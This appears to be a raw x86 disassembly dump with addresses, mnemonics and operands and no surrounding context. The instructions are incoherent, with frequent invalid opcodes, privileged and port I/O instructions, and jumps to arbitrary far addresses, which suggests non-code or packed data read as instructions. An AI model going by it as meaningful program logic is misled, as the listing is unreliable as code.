  41e02d:	add    DWORD PTR [edx+0x41d56145],ecx
  41e033:	data16 add ch,0xf5
  41e037:	push   esi
  41e038:	mov    BYTE PTR [edi+0x7f31e19a],dl
  41e03e:	sub    ah,bh
  41e040:	adc    DWORD PTR ds:0x9a734824,esp
  41e046:	loopne 0x41e017
  41e048:	call   0x8a6af819
  41e04d:	int    0xb5
  41e04f:	lds    edx,FWORD PTR [edx+0x1f]
  41e052:	cmp    eax,0xec83464b
  41e057:	mov    edi,eax
  41e059:	lds    edi,FWORD PTR [eax-0x2c]
  41e05c:	(bad)  
  41e05d:	rcl    DWORD PTR [eax+edx*2+0x3052a4db],cl
  41e064:	mov    ebp,ecx
  41e066:	cmp    BYTE PTR [ecx-0x18a83805],0xc3
  41e06d:	push   ds
  41e06e:	sbb    bl,BYTE PTR [edi]
  41e070:	pop    es
  41e071:	aaa    
  41e072:	or     BYTE PTR [esi+0x1d287f09],ah
  41e078:	ja     0x41e034
  41e07a:	test   DWORD PTR [edi],0xd4e18509
  41e080:	daa    
  41e081:	xor    BYTE PTR [eax+0x1e],cl
  41e084:	and    al,0x8c
  41e086:	mov    dl,ch
  41e088:	test   al,0x20
  41e08a:	hlt    
  41e08b:	call   0xa189:0x1ec2a1a0
  41e092:	xchg   edi,eax
  41e093:	fdivr  QWORD PTR [ebx-0x4f]
  41e096:	push   ss
  41e097:	mov    bl,0x30
  41e099:	add    al,BYTE PTR [edx+ecx*4+0x70]
  41e09d:	xchg   ebx,eax
  41e09e:	je     0x41e046
  41e0a0:	xchg   DWORD PTR [ecx+0x4a608160],edi
  41e0a6:	aad    0xe6
  41e0a8:	or     al,0xe5
  41e0aa:	call   esp
  41e0ac:	and    ch,0x20
  41e0af:	ret    
  41e0b0:	sahf   
  41e0b1:	(bad)  
  41e0b2:	mov    edx,0xed118881
  41e0b7:	in     eax,dx
  41e0b8:	mov    ebx,0x2788b4b
  41e0be:	test   BYTE PTR [esi+0x3a7e5a03],al
  41e0c4:	push   edi
  41e0c5:	pop    esp
  41e0c6:	push   ds
  41e0c7:	ret    
  41e0c8:	dec    ecx
  41e0c9:	xchg   edi,eax
  41e0ca:	push   0x12b408d2
  41e0cf:	aam    0x40
  41e0d1:	jmp    0x65f2:0x42f1b457
  41e0d8:	mov    DWORD PTR [edi-0x5b],ecx
  41e0db:	icebp  
  41e0dc:	inc    esi
  41e0dd:	aas    
  41e0de:	xchg   esp,eax
  41e0df:	cdq    
  41e0e0:	dec    eax
  41e0e1:	add    cl,dl
  41e0e3:	(bad)  
  41e0e4:	cld    
  41e0e5:	jb     0x41e099
  41e0e7:	fld    TBYTE PTR [eax]
  41e0e9:	rcr    BYTE PTR [ebx-0x1b],1
  41e0ec:	retf   0x60e7
  41e0ef:	lea    ecx,[esi+edi*1-0x1e95fed]
  41e0f6:	jg     0x41e0bd
  41e0f8:	jae    0x41e0fc
  41e0fa:	or     BYTE PTR [ecx],dh
  41e0fc:	sbb    eax,0x80af54a7
  41e101:	lds    edi,FWORD PTR [esi-0x23]
  41e104:	jge    0x5dd6b6c8
  41e10a:	dec    eax
  41e10b:	stos   DWORD PTR es:[edi],eax
  41e10c:	mov    WORD PTR [eax],es
  41e10e:	adc    BYTE PTR [eax+0x51],dh
  41e111:	pushw  cs
  41e113:	push   0x4
  41e115:	mov    eax,ds:0x5b66dc8a
  41e11a:	pop    ds
  41e11b:	cmc    
  41e11c:	aas    
  41e11d:	jne    0x41e196
  41e11f:	stos   DWORD PTR es:[edi],eax
  41e120:	xlat   BYTE PTR ds:[ebx]
  41e121:	xor    BYTE PTR [eax+ecx*8],cl
  41e124:	stc    
  41e125:	add    ch,BYTE PTR [edx+ebx*4+0x78d7e028]
  41e12c:	xor    edi,DWORD PTR [eax-0x56dd04e1]
  41e132:	cmp    ebp,esp
  41e134:	push   cs
  41e135:	sbb    al,0x41
  41e137:	lahf   
  41e138:	iret   
  41e139:	sbb    DWORD PTR [edx+0x1d138155],esi
  41e13f:	inc    edi
  41e140:	ret    0x1e12
  41e143:	(bad)  
  41e145:	or     al,0x33
  41e147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e148:	sti    
  41e149:	adc    DWORD PTR [esi-0x47fa3a3c],ecx
  41e14f:	test   DWORD PTR [ecx+0x1e],0xfa3e8f3
  41e156:	pusha  
  41e157:	mov    bl,0xc2
  41e159:	std    
  41e15a:	xchg   ebp,eax
  41e15b:	push   cs
  41e15c:	xlat   BYTE PTR ds:[ebx]
  41e15d:	jae    0x41e17c
  41e15f:	pop    eax
  41e160:	das    
  41e161:	inc    edx
  41e162:	push   ds
  41e163:	cmp    bh,dl
  41e165:	lahf   
  41e166:	add    al,0xf5
  41e168:	pop    eax
  41e169:	(bad)  [edx+0x57]
  41e16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e16d:	and    al,0xba
  41e16f:	mov    ebx,0x9fb68051
  41e174:	push   esp
  41e175:	or     esi,DWORD PTR [edi]
  41e177:	add    edx,eax
  41e179:	add    eax,0xcbe37e6c
  41e17e:	in     eax,dx
  41e17f:	enter  0x9f2a,0x60
  41e183:	mov    ebp,0xb9c6a275
  41e188:	jb     0x41e1ec
  41e18a:	data16 aad 0xe
  41e18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e18e:	dec    esp
  41e18f:	test   al,0x67
  41e191:	les    ebp,FWORD PTR [esi+0x562389f3]
  41e197:	push   esp
  41e198:	lds    ebx,FWORD PTR [edi-0x12]
  41e19b:	pop    ebp
  41e19c:	push   ss
  41e19d:	add    ah,BYTE PTR [esi+eiz*2+0x4d]
  41e1a1:	jg     0x41e1c9
  41e1a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a4:	imul   edx,ebp,0x66
  41e1a7:	imul   ebx,DWORD PTR [eax-0x1d],0xffffffde
  41e1ab:	das    
  41e1ac:	int    0x42
  41e1ae:	sbb    DWORD PTR [esi-0x4a5dfd31],edi
  41e1b4:	jmp    DWORD PTR [eax-0x19736309]
  41e1ba:	aas    
  41e1bb:	in     eax,0x89
  41e1bd:	mov    bl,0xf0
  41e1bf:	sbb    al,0xc0
  41e1c1:	retf   
  41e1c2:	sbb    bh,bh
  41e1c4:	add    BYTE PTR ds:0xaa80a010,0xa7
  41e1cb:	cmp    bl,BYTE PTR [edi]
  41e1cd:	sub    eax,0xf791972b
  41e1d2:	call   0x57543046
  41e1d7:	aad    0x63
  41e1d9:	push   ss
  41e1da:	scas   eax,DWORD PTR es:[edi]
  41e1db:	in     eax,dx
  41e1dc:	stos   BYTE PTR es:[edi],al
  41e1dd:	or     ebx,DWORD PTR ds:[esi-0x2a93b609]
  41e1e4:	sub    ebp,esi
  41e1e6:	push   es
  41e1e7:	(bad)  
  41e1e8:	(bad)  
  41e1e9:	cmc    
  41e1ea:	sbb    al,0xd7
  41e1ec:	lahf   
  41e1ed:	loope  0x41e1ca
  41e1ef:	push   es
  41e1f0:	mov    esp,0x89edc0ea
  41e1f5:	in     eax,0x40
  41e1f7:	in     eax,dx
  41e1f8:	xchg   esi,eax
  41e1f9:	hlt    
  41e1fa:	aam    0xb7
  41e1fc:	jl     0x41e261
  41e1fe:	cdq    
  41e1ff:	aad    0x17
  41e201:	jl     0x41e23b
  41e203:	jne    0x41e196
  41e205:	cmp    al,0x28
  41e207:	pop    esp
  41e208:	mov    DWORD PTR [ecx],eax
  41e20a:	mov    eax,ds:0xe02ea943
  41e20f:	aas    
  41e210:	sub    ebp,DWORD PTR [esp+edx*4]
  41e213:	mov    edx,0x7f65fa3f
  41e218:	xchg   edi,eax
  41e219:	pop    ebx
  41e21a:	dec    edi
  41e21b:	cmp    al,0x3
  41e21d:	add    esp,DWORD PTR [ebx+0x1f]
  41e220:	out    dx,eax
  41e221:	and    eax,DWORD PTR [edx]
  41e223:	inc    esi
  41e224:	int    0x7
  41e226:	lahf   
  41e227:	clc    
  41e228:	lock pop es
  41e22a:	pusha  
  41e22b:	ror    DWORD PTR [edi-0x551e9e6c],cl
  41e231:	(bad)  
  41e232:	clc    
  41e233:	aad    0xeb
  41e235:	aad    0xab
  41e237:	mov    dl,0x5f
  41e239:	mov    WORD PTR [eax-0x42],ds
  41e23c:	mov    DWORD PTR [ecx],ebp
  41e23e:	xor    edi,esi
  41e240:	sti    
  41e241:	fldcw  WORD PTR [edx+0x66]
  41e244:	push   eax
  41e245:	push   edx
  41e246:	push   ss
  41e247:	mov    esi,0x184802b1
  41e24c:	cmp    al,0x47
  41e24e:	call   0x4cad:0x57b3df2f
  41e255:	fs in  eax,dx
  41e257:	call   0x9348:0x72a0864f
  41e25e:	popf   
  41e25f:	aam    0x6f
  41e261:	fcmovb st,st(2)
  41e263:	imul   eax,DWORD PTR [ebx+0x3a],0x3473e737
  41e26a:	mov    bh,0x4b
  41e26c:	test   DWORD PTR [esi-0x5b85aea0],eax
  41e272:	mov    eax,ds:0x82710fc0
  41e277:	add    ch,BYTE PTR [eax]
  41e279:	sbb    eax,0x7a5d447
  41e27e:	push   es
  41e27f:	fild   DWORD PTR ds:0x7d2090e8
  41e285:	addr16 pop ds
  41e287:	xchg   ebx,eax
  41e288:	imul   ebp,DWORD PTR [ebx+ebp*1+0x54],0xffffff8d
  41e28d:	in     eax,0x7f
  41e28f:	(bad)  
  41e291:	std    
  41e292:	push   es
  41e293:	daa    
  41e294:	gs leave 
  41e296:	inc    ebx
  41e297:	and    eax,0x39b005e2
  41e29c:	sub    edx,DWORD PTR [ebp-0x27]
  41e29f:	sbb    cl,BYTE PTR [ecx+0x662103d5]
  41e2a5:	sub    DWORD PTR [esi+0x11e3c07d],ebx
  41e2ab:	aam    0xdc
  41e2ad:	pop    edx
  41e2ae:	mov    ecx,0xf92f9f71
  41e2b3:	jmp    0xf9fe:0xfb64d261
  41e2ba:	xor    bl,cl
  41e2bc:	popf   
  41e2bd:	lds    eax,FWORD PTR [ebp+0x6e1cd086]
  41e2c3:	fistp  DWORD PTR [edx+0x48bc4a1d]
  41e2c9:	mov    edi,0x4e60f442
  41e2ce:	push   ds
  41e2cf:	jecxz  0x41e281
  41e2d1:	mov    ebx,0x831a7ad0
  41e2d6:	jp     0x41e275
  41e2d8:	push   ecx
  41e2d9:	sub    ch,dh
  41e2db:	push   eax
  41e2dc:	rol    BYTE PTR [esi-0x7c891a18],1
  41e2e2:	out    dx,al
  41e2e3:	mov    BYTE PTR ds:0xc83d0e03,bl
  41e2e9:	shl    BYTE PTR [edi+0x60ee703d],1
  41e2ef:	in     eax,dx
  41e2f0:	pop    edi
  41e2f1:	sub    DWORD PTR [ebx+0x2c],ecx
  41e2f4:	sub    bl,BYTE PTR [ebx+ecx*1+0x5c2c54d4]
  41e2fb:	ins    DWORD PTR es:[edi],dx
  41e2fc:	fnstcw WORD PTR [edi]
  41e2fe:	fimul  WORD PTR [edi]
  41e300:	xchg   DWORD PTR [ecx+0x31],edi
  41e303:	rcl    DWORD PTR [ebp+0x4f],cl
  41e306:	fisub  WORD PTR [edx-0x2bd449fe]
  41e30c:	outs   dx,DWORD PTR ds:[esi]
  41e30d:	nop
  41e30e:	cmp    BYTE PTR [edi-0x4e729c5f],ah
  41e314:	clc    
  41e315:	clc    
  41e316:	pop    ds
  41e317:	dec    ecx
  41e318:	mov    eax,0xce5e55e0
  41e31d:	out    dx,al
  41e31e:	push   ecx
  41e31f:	je     0x41e2c0
  41e321:	adc    al,0xe
  41e323:	mov    edi,0x523db71
  41e328:	inc    esp
  41e329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32a:	pop    edi
  41e32b:	ror    DWORD PTR [ebx-0x4dac37dd],1
  41e331:	jecxz  0x41e390
  41e333:	arpl   WORD PTR [ecx],cx
  41e335:	jmp    0x5f0448f6
  41e33a:	mov    ss,ebp
  41e33c:	ret    
  41e33d:	stc    
  41e33e:	pop    esp
  41e33f:	mov    al,0x46
  41e341:	retf   
  41e342:	lods   al,BYTE PTR ds:[esi]
  41e343:	ror    DWORD PTR [ecx+0x9548e0d],1
  41e349:	ret    
  41e34a:	jl     0x41e365
  41e34c:	mov    ds:0xcce34e14,eax
  41e351:	xchg   DWORD PTR [eax+0x1f2cda18],ebx
  41e357:	dec    ebx
  41e358:	and    bl,dh
  41e35a:	xor    al,0x38
  41e35c:	mov    DWORD PTR [ecx-0x3d],ebp
  41e35f:	(bad)  
  41e360:	pop    ds
  41e361:	fld    QWORD PTR [edx]
  41e363:	pop    edi
  41e364:	test   DWORD PTR [edx],0xe80305d4
  41e36a:	push   edx
  41e36b:	push   esp
  41e36c:	(bad)  
  41e36d:	ror    BYTE PTR [esp+ebp*4],1
  41e370:	mov    BYTE PTR [ecx-0x71],ch
  41e373:	push   es
  41e374:	iret   
  41e375:	push   cs
  41e376:	inc    edx
  41e377:	iret   
  41e378:	adc    eax,0x20ebe001
  41e37d:	jge    0x41e305
  41e37f:	lock jg 0x41e365
  41e382:	fwait
  41e383:	out    0x88,eax
  41e385:	mov    ebx,0x70a71c54
  41e38a:	jo     0x41e352
  41e38c:	xor    al,0x2
  41e38e:	pop    edx
  41e38f:	outs   dx,DWORD PTR ds:[esi]
  41e390:	mov    cl,0x8f
  41e392:	sub    al,0x84
  41e394:	adc    BYTE PTR [esi+0x1f],bl
  41e397:	inc    ebp
  41e398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e399:	add    ebx,DWORD PTR [ebx+0x741262]
  41e39f:	mov    ebx,0x135f06af
  41e3a4:	mov    ebp,ebx
  41e3a6:	rcl    DWORD PTR [ecx+0x54052def],0x89
  41e3ad:	dec    ebx
  41e3ae:	rcr    BYTE PTR [edx-0x34],cl
  41e3b1:	popf   
  41e3b2:	out    dx,al
  41e3b3:	adc    eax,0x7ec003b6
  41e3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b9:	dec    edx
  41e3ba:	pop    ds
  41e3bb:	je     0x41e3e2
  41e3bd:	stos   BYTE PTR es:[edi],al
  41e3be:	(bad)  
  41e3bf:	hlt    
  41e3c0:	mov    dl,0x1b
  41e3c2:	fcmovb st,st(6)
  41e3c4:	or     ebx,ecx
  41e3c6:	mov    WORD PTR ss:[edi+ebp*4],fs
  41e3ca:	mov    dh,0x74
  41e3cc:	xchg   edx,eax
  41e3cd:	add    bl,BYTE PTR [eax+0x1701b31a]
  41e3d3:	inc    esi
  41e3d4:	push   ss
  41e3d5:	enter  0x4400,0xd1
  41e3d9:	jecxz  0x41e446
  41e3db:	dec    DWORD PTR [ecx+0x58c13c37]
  41e3e1:	fsubr  st(0),st
  41e3e3:	aad    0x51
  41e3e5:	mov    edx,0x6cdfd3a4
  41e3ea:	jle    0x41e3ec
  41e3ec:	mov    DWORD PTR [ebp+0x7de82b66],eax
  41e3f2:	pop    edi
  41e3f3:	mov    ch,0x8a
  41e3f5:	faddp  st(6),st
  41e3f7:	aam    0x1e
  41e3f9:	icebp  
  41e3fa:	addr16 pop edi
  41e3fc:	rcr    DWORD PTR [esi-0x6e7833d1],1
  41e402:	mov    ecx,0x7f74dc41
  41e407:	and    BYTE PTR [esi+0x3a],ch
  41e40a:	retf   0x76ba
  41e40d:	or     eax,0xf048d0ad
  41e412:	loopne 0x41e458
  41e414:	mov    edi,0x3c1b1fb5
  41e419:	mov    ds:0xf702b9f9,al
  41e41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e41f:	rol    BYTE PTR [ecx-0x45],cl
  41e422:	mov    eax,ds:0x60834581
  41e427:	pusha  
  41e428:	jne    0x41e3d2
  41e42a:	pusha  
  41e42b:	retf   
  41e42c:	mov    ecx,0xd873cfee
  41e431:	bound  edx,QWORD PTR [esi]
  41e433:	xchg   ebp,eax
  41e434:	pop    ecx
  41e436:	adc    ch,0xf0
  41e439:	adc    al,0xf5
  41e43b:	mov    WORD PTR [esi],?
  41e43d:	fistp  WORD PTR [edi]
  41e43f:	loope  0x41e3d3
  41e441:	xor    eax,ecx
  41e443:	out    0x42,al
  41e445:	xchg   ebx,eax
  41e446:	mov    dl,0x9e
  41e448:	aam    0x17
  41e44a:	into   
  41e44b:	aad    0xc1
  41e44d:	push   eax
  41e44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44f:	adc    DWORD PTR [edi],edx
  41e451:	xor    BYTE PTR [edx+0x15],bh
  41e454:	inc    ecx
  41e455:	fcmovnu st,st(1)
  41e457:	pop    ecx
  41e458:	or     ah,ch
  41e45a:	lds    edx,FWORD PTR ds:0xba96e106
  41e460:	xlat   BYTE PTR ds:[ebx]
  41e461:	in     al,0x33
  41e463:	mov    edi,0x21f879c8
  41e468:	xchg   eax,edi
  41e46a:	pusha  
  41e46b:	pop    es
  41e46c:	inc    edi
  41e46d:	pop    esi
  41e46e:	(bad)  
  41e46f:	sbb    BYTE PTR gs:[edi+0x1d],bh
  41e473:	xlat   BYTE PTR ds:[ebx]
  41e474:	clc    
  41e475:	hlt    
  41e476:	jge    0x41e41e
  41e478:	add    DWORD PTR [ecx+ebx*1+0x48],ebp
  41e47c:	mov    BYTE PTR [ebp+0x7107ad56],bl
  41e482:	cli    
  41e483:	push   0x8d0e153a
  41e488:	int3   
  41e489:	xor    DWORD PTR [ebx+0x58],esi
  41e48c:	or     esp,ecx
  41e48e:	jo     0x41e416
  41e490:	sbb    WORD PTR [ecx],0xffa2
  41e494:	mov    dl,0xc9
  41e496:	mov    DWORD PTR [edx+0x78e88c88],eax
  41e49c:	push   edx
  41e49d:	data16 (bad) 
  41e49f:	xlat   BYTE PTR ds:[ebx]
  41e4a0:	pop    es
  41e4a1:	ficomp WORD PTR [ecx+edi*8+0x42]
  41e4a5:	jbe    0x41e48b
  41e4a7:	or     al,0xb3
  41e4a9:	cs pop ds
  41e4ab:	fnstsw WORD PTR [ecx]
  41e4ad:	mov    ah,0x70
  41e4af:	cs aam 0xb7
  41e4b2:	add    edx,esp
  41e4b4:	je     0x41e521
  41e4b6:	call   0xf2003935
  41e4bb:	pop    edi
  41e4bc:	test   eax,0x7ba01c7c
  41e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c2:	pusha  
  41e4c3:	test   DWORD PTR [esi-0x7fc16ee9],0xa4d4a7e5
  41e4cd:	and    BYTE PTR [edi],dl
  41e4cf:	jae    0x41e4b9
  41e4d1:	mov    ds:0x1f885c78,eax
  41e4d6:	push   eax
  41e4d7:	pop    ds
  41e4d8:	pop    esp
  41e4d9:	xor    ah,BYTE PTR [ebx]
  41e4db:	sbb    eax,0x51c002cd
  41e4e0:	ins    BYTE PTR es:[edi],dx
  41e4e1:	xchg   edx,eax
  41e4e2:	test   BYTE PTR [ecx+0x0],ah
  41e4e5:	mov    esp,0xa60b5d65
  41e4ea:	inc    esi
  41e4eb:	(bad)  
  41e4ec:	bnd ret 0xd6f8
  41e4f0:	cmp    eax,0x3606cc1d
  41e4f5:	push   ss
  41e4f6:	sti    
  41e4f7:	adc    DWORD PTR [edx-0x5ada882a],ebp
  41e4fd:	or     esp,DWORD PTR [eax+0x4b]
  41e500:	add    eax,0x3a72f49e
  41e505:	ja     0x41e4e3
  41e507:	fwait
  41e508:	loope  0x41e4b5
  41e50a:	xor    edx,esp
  41e50c:	sub    edi,DWORD PTR [eax]
  41e50e:	push   0x60db67e5
  41e513:	pop    edi
  41e514:	mov    ebx,DWORD PTR [ebx-0x6]
  41e517:	in     eax,dx
  41e518:	xchg   BYTE PTR [ecx-0x6de55468],ah
  41e51e:	fimul  WORD PTR [edi+0x7e20c9b1]
  41e524:	jmp    0x88a7fb4a
  41e529:	mov    bl,0x48
  41e52b:	or     al,0x25
  41e52d:	test   al,0x8b
  41e52f:	cmp    BYTE PTR [ecx],0x3
  41e532:	bound  ebp,QWORD PTR [eax+edi*8-0x66]
  41e536:	and    ecx,DWORD PTR [ecx]
  41e538:	xchg   edx,eax
  41e539:	and    DWORD PTR [eax+0x27],0xffffffeb
  41e53d:	and    esp,DWORD PTR [edi+0x541feefa]
  41e543:	aad    0x14
  41e545:	jo     0x41e5aa
  41e547:	pop    es
  41e548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e549:	add    BYTE PTR cs:[esi-0x73017477],ch
  41e550:	mov    ebx,0x93bde4d3
  41e555:	jne    0x41e534
  41e557:	retf   
  41e558:	jae    0x41e57e
  41e55a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e55b:	and    DWORD PTR [edi],0x18b15f4a
  41e561:	adc    DWORD PTR [edx+edi*2],eax
  41e564:	mov    DWORD PTR [ecx-0x5e],esi
  41e567:	cmc    
  41e568:	stos   DWORD PTR es:[edi],eax
  41e569:	rsm    
  41e56b:	pop    ecx
  41e56c:	leave  
  41e56d:	add    bl,BYTE PTR [edx-0x67]
  41e570:	aas    
  41e571:	arpl   WORD PTR [ebp+0x1f8becfe],bp
  41e577:	jmp    0xe20e4a33
  41e57c:	and    al,0xdd
  41e57e:	fcmovnbe st,st(4)
  41e580:	pop    eax
  41e581:	xchg   esp,eax
  41e582:	int    0x1a
  41e584:	sbb    cl,cl
  41e586:	jno    0x41e598
  41e588:	mov    BYTE PTR [edi],cl
  41e58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e58b:	dec    edi
  41e58c:	mov    eax,0xbdbff0d4
  41e591:	sub    eax,esi
  41e593:	stos   DWORD PTR es:[edi],eax
  41e594:	in     al,0x7f
  41e596:	and    esp,ebp
  41e598:	mov    esp,0x9514bb64
  41e59d:	mov    dl,0x96
  41e59f:	xchg   ecx,eax
  41e5a0:	push   ebx
  41e5a1:	mov    dl,0x5c
  41e5a3:	cmp    eax,0x5b3405aa
  41e5a8:	mov    cs:0x2599ff2,al
  41e5ae:	(bad)  
  41e5af:	cli    
  41e5b0:	in     eax,0x1f
  41e5b2:	iret   
  41e5b3:	fdivr  DWORD PTR [edi]
  41e5b5:	jmp    0x15ce:0xf46a1f77
  41e5bc:	test   BYTE PTR [edi+edx*8+0x4e037d58],al
  41e5c3:	retf   
  41e5c4:	xchg   ebx,eax
  41e5c5:	push   DWORD PTR [edi-0x6d]
  41e5c8:	loop   0x41e585
  41e5ca:	pop    ds
  41e5cb:	jno    0x41e5f2
  41e5cd:	adc    BYTE PTR [ebx-0x50],dl
  41e5d0:	jo     0x41e5ac
  41e5d2:	sub    edi,edx
  41e5d4:	sbb    al,0x6c
  41e5d6:	xchg   edi,eax
  41e5d7:	inc    ebx
  41e5d8:	ins    DWORD PTR es:[edi],dx
  41e5d9:	push   esi
  41e5da:	mov    al,0xad
  41e5dc:	mov    ecx,ebp
  41e5de:	(bad)  
  41e5df:	jmp    0x41e630
  41e5e1:	xor    al,0xc5
  41e5e3:	repnz add ah,BYTE PTR fs:[esi]
  41e5e7:	ds mov esp,0xf85b2d2d
  41e5ed:	add    al,0x60
  41e5ef:	pop    ds
  41e5f0:	push   0xfc28d077
  41e5f5:	xchg   esi,eax
  41e5f6:	icebp  
  41e5f7:	mov    ebx,0x9a4ab77b
  41e5fc:	mov    bh,dl
  41e5fe:	imul   esi,DWORD PTR [ebx-0x36e1ffe9],0x59c0e498
  41e608:	cmp    BYTE PTR [esi+0x11],al
  41e60b:	mov    ebx,0x3de799fe
  41e610:	dec    eax
  41e611:	stos   BYTE PTR es:[edi],al
  41e612:	and    esp,DWORD PTR [edi-0x5c66148d]
  41e618:	and    al,0x2
  41e61a:	enter  0x54fa,0x30
  41e61e:	xchg   di,ax
  41e620:	jnp    0x41e697
  41e622:	paddw  mm7,QWORD PTR [ecx+0x30]
  41e626:	pop    ds
  41e627:	out    0x59,eax
  41e629:	retf   0xa32c
  41e62c:	or     BYTE PTR [ebx+0xe7ad593],al
  41e632:	lds    edi,FWORD PTR [esi+0x7da2d397]
  41e638:	xchg   ebp,eax
  41e639:	popf   
  41e63a:	inc    edx
  41e63b:	imul   eax,DWORD PTR [eax+0x52cd3700],0x1a
  41e642:	ficomp WORD PTR [esp+ebp*1+0x48d43cf2]
  41e649:	and    edx,ecx
  41e64b:	mov    WORD PTR [eax-0x763998f6],cs
  41e651:	out    0x7c,eax
  41e653:	repz push esp
  41e655:	fistp  DWORD PTR [esi+0x2d]
  41e658:	cmp    eax,0x272c6837
  41e65d:	add    bh,BYTE PTR [esp+esi*4]
  41e660:	in     eax,0x6
  41e662:	cmp    BYTE PTR [ecx-0x4d],al
  41e665:	xchg   edi,eax
  41e666:	xchg   ecx,eax
  41e667:	dec    eax
  41e668:	mov    DWORD PTR [ecx],ecx
  41e66a:	mov    edi,0x7c4b7e7f
  41e66f:	aam    0x26
  41e671:	dec    eax
  41e672:	out    dx,al
  41e673:	xor    DWORD PTR [ebp+0x21],esp
  41e676:	cld    
  41e677:	lock mov DWORD PTR [ebx-0x3c09d738],ecx
  41e67e:	test   al,0x50
  41e680:	xor    eax,DWORD PTR [edi+0x76]
  41e683:	cli    
  41e684:	scas   eax,DWORD PTR es:[edi]
  41e685:	add    dl,BYTE PTR [edi]
  41e687:	push   ebx
  41e688:	pop    es
  41e689:	xchg   dh,cl
  41e68b:	ror    DWORD PTR [eax+0x363f88f9],1
  41e691:	cli    
  41e692:	pop    esp
  41e693:	pop    ebp
  41e694:	aaa    
  41e695:	out    0xe0,eax
  41e697:	imul   ebx,DWORD PTR [esi-0x6b550278],0x4e55b797
  41e6a1:	das    
  41e6a2:	imul   esi,DWORD PTR [edx],0xffffff88
  41e6a5:	xchg   edi,eax
  41e6a6:	fcomp  QWORD PTR [edi+eax*2-0x111a4ff0]
  41e6ad:	add    bh,BYTE PTR [esp+eiz*8-0x3e18a9b4]
  41e6b4:	mov    dh,0x16
  41e6b6:	push   ds
  41e6b7:	mov    ecx,0xc53dfffd
  41e6bc:	rcl    ebx,1
  41e6be:	mov    ebx,0xcff36c64
  41e6c3:	aam    0x95
  41e6c5:	ins    BYTE PTR es:[edi],dx
  41e6c6:	loop   0x41e6f6
  41e6c8:	push   0x2
  41e6ca:	cmc    
  41e6cb:	in     eax,dx
  41e6cc:	mov    BYTE PTR [ebx-0x3b],ch
  41e6cf:	jmp    0x41e723
  41e6d1:	(bad)  
  41e6d2:	add    cl,bh
  41e6d4:	and    al,0xd3
  41e6d6:	loopne 0x41e691
  41e6d8:	sub    cl,BYTE PTR [ebx-0x17]
  41e6db:	or     ecx,ecx
  41e6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6de:	cmp    eax,0x9ad5c075
  41e6e3:	icebp  
  41e6e4:	mov    ch,0x5
  41e6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e7:	hlt    
  41e6e8:	or     BYTE PTR [ecx+0x154d4d94],0x38
  41e6ef:	out    0xb5,al
  41e6f1:	enter  0xb416,0x84
  41e6f5:	fisub  WORD PTR [edi+0x55b38936]
  41e6fb:	xchg   esp,eax
  41e6fc:	out    0x93,eax
  41e6fe:	lods   al,BYTE PTR ds:[esi]
  41e6ff:	ss pushf 
  41e701:	add    dl,BYTE PTR [edx-0x2]
  41e704:	inc    eax
  41e705:	jno    0x41e711
  41e707:	inc    edi
  41e708:	in     eax,0xb0
  41e70a:	pusha  
  41e70b:	pop    ecx
  41e70c:	cmp    al,0x52
  41e70e:	nop
  41e70f:	cmp    al,0x36
  41e711:	ret    0xd43f
  41e714:	dec    edi
  41e715:	lahf   
  41e716:	cmc    
  41e717:	stos   BYTE PTR es:[edi],al
  41e718:	mov    esp,DWORD PTR [ebx+ebp*2]
  41e71b:	fisttp QWORD PTR [eax-0x7f0fd2b7]
  41e721:	aas    
  41e722:	idiv   edx
  41e724:	push   es
  41e725:	add    dl,BYTE PTR [edx]
  41e727:	retf   
  41e728:	or     al,0x4e
  41e72a:	(bad)  
  41e72b:	bound  ecx,QWORD PTR [ecx]
  41e72d:	jbe    0x41e731
  41e72f:	pop    esi
  41e730:	shl    DWORD PTR [ecx-0x1876dfe8],0x57
  41e737:	cmp    edx,DWORD PTR [edx+0x24]
  41e73a:	and    eax,0x6e482ead
  41e73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e740:	push   ss
  41e741:	addr16 pop edi
  41e743:	sub    al,0xed
  41e745:	aam    0x46
  41e747:	add    DWORD PTR [ecx+esi*4+0x60],esp
  41e74b:	adc    edi,DWORD PTR [edx-0x1d68f6e8]
  41e751:	add    dh,BYTE PTR [esi-0x12]
  41e754:	xor    al,0x42
  41e756:	mul    DWORD PTR [ebx-0x389f6e11]
  41e75c:	mov    esi,DWORD PTR [eax+0x4f]
  41e75f:	das    
  41e760:	test   BYTE PTR ds:0x3c84d49e,0x9
  41e767:	sahf   
  41e768:	clc    
  41e769:	arpl   WORD PTR ss:[esi-0x78],si
  41e76d:	cmp    DWORD PTR [esi-0x74],eax
  41e770:	mov    bh,0xe9
  41e772:	and    edx,DWORD PTR [ebx-0x48]
  41e775:	(bad)  
  41e776:	stc    
  41e777:	jle    0x41e703
  41e779:	push   ecx
  41e77a:	jne    0x41e763
  41e77c:	call   0x106ec10e
  41e781:	clc    
  41e782:	pop    ds
  41e783:	mov    ch,0x59
  41e785:	cld    
  41e786:	int    0x7f
  41e788:	cwde   
  41e789:	add    al,0x45
  41e78b:	aam    0x28
  41e78d:	popf   
  41e78e:	pop    es
  41e78f:	aas    
  41e790:	sbb    dh,dl
  41e792:	push   edi
  41e793:	adc    eax,0xf5925b81
  41e798:	mov    bh,0x0
  41e79a:	popa   
  41e79b:	push   cs
  41e79c:	push   ds
  41e79d:	and    dh,ch
  41e79f:	push   esi
  41e7a0:	mov    dh,0x5
  41e7a2:	call   0x2a6c:0x58424d4e
  41e7a9:	cmp    DWORD PTR [ebp+0x45],edi
  41e7ac:	or     bl,BYTE PTR [esi]
  41e7ae:	inc    edi
